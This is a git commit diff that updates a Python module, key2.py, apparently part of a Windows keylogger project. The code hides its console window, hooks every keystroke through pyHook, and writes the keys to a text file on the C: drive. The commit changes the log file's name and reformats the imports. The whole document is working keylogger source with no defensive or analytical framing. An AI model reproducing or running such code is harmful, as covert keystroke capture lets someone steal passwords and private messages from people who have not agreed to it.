edc6e1b96ab9f3cfd56ec58d90d258f0b9d1f10c
xn16h77 <32337979+xn16h77@users.noreply.github.com>
2017-11-01 09:44:51 +0900

    Update key2.py

--- modules/key2.py
+++ modules/key2.py
@@ -1,7 +1,8 @@
 import win32api
 import win32console
 import win32gui
-import pythoncom,pyHook
+import pythoncom
+import pyHook
 
 win=win32console.GetConsoleWindow()
 win32gui.ShowWindow(win,0)
@@ -10,10 +11,12 @@ def OnKeyboardEvent(event):
     if event.Ascii==5:
         _exit(1)
     if event.Ascii !=0 or 8:
-        f=open('c:\output.txt','r+')
+        f=open('c:\oxn.txt','a')
+        f.close()
+        f=open('c:\oxn.txt','r+')
         buffer=f.read()
         f.close()
-        f=open('c:\output.txt','w')
+        f=open('c:\oxn.txt','w')
         keylogs=chr(event.Ascii)
         if event.Ascii==13:
             keylogs='/n'
@@ -24,4 +27,3 @@ hm=pyHook.HookManager()
 hm.KeyDown=OnKeyboardEvent
 hm.HookKeyboard()
 pythoncom.PumpMessages()
-
